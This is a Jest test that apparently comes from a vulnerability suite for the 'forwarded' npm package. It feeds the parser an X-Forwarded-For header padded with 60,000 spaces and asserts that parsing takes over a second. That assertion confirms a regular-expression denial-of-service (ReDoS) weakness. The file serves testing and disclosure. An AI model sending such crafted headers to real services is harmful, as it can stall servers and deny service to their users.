test("ReDos in forwarded", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  var fresh = require("forwarded");
  var str = "x" + genstr(60000, " ") + "x";
  let t = measureTime(function () {
    fresh({
      headers: { "x-forwarded-for": str },
      connection: { remoteAddress: "0.0.0.0" },
    });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
